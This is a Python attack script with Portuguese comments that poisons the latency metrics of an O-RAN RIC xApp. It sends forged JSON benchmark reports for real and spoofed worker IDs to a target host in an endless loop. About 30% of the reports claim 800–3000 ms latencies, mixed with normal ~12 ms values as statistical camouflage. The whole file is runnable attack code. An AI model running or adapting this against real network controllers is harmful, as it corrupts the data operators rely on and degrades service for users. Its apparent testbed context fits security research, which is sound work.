"""
ataque_latency_poison.py - Ataque de Envenenamento de Latência (xApp)
Alvo: Workers de benchmark do xApp via interface E2
Efeito: 30% das requisicoes reportam latencia >800ms (ate 3000ms),
        corrompendo as medias de latencia que o xApp usa para decisoes.
        Usa camuflagem: 70% das requisicoes sao normais (~12ms).
"""

import threading
import urllib.request
import json
import time
import random
import sys

RIC_HOST = sys.argv[1] if len(sys.argv) > 1 else "ric-service"
RIC_PORT = sys.argv[2] if len(sys.argv) > 2 else "8080"
BASE_URL = f"http://{RIC_HOST}:{RIC_PORT}"

print("=" * 60)
print("  ATAQUE: LATENCY POISON (xApp)")
print(f"  Alvo: {BASE_URL}")
print("  Envenena latencia dos workers: 30% > 800ms")
print("=" * 60)

# IDs de workers alvo (inclui os 4 originais + falsos)
WORKER_IDS = [
    "bench-worker-0", "bench-worker-1",
    "bench-worker-2", "bench-worker-3",
    "bench-worker-4", "bench-worker-5",
    "bench-worker-6", "bench-worker-7"
]

def ataque_latency_poison():
    """30% latencia alta, 70% normal (camuflagem estatistica)"""
    while True:
        try:
            worker_id = random.choice(WORKER_IDS)
            
            # 30% de chance: latencia altissima (ataque)
            # 70% de chance: latencia normal (camuflagem)
            if random.random() < 0.3:
                latency = round(random.uniform(800, 3000), 2)
            else:
                latency = round(random.gauss(12, 3), 2)
            
            ataque = {
                "id": worker_id,
                "latency_ms": latency,
                "type": "benchmark",
                "seq": random.randint(1, 10000)
            }
            
            data = json.dumps(ataque).encode()
            req = urllib.request.Request(BASE_URL, data=data, method="POST")
            req.add_header('Content-Type', 'application/json')
            with urllib.request.urlopen(req, timeout=2): pass
            
            time.sleep(0.5)  # ~2 ataques/s
            
        except Exception as e:
            print(f"[LatencyPoison] Erro: {e}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        ataque_latency_poison()
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido pelo operador")
        sys.exit(0)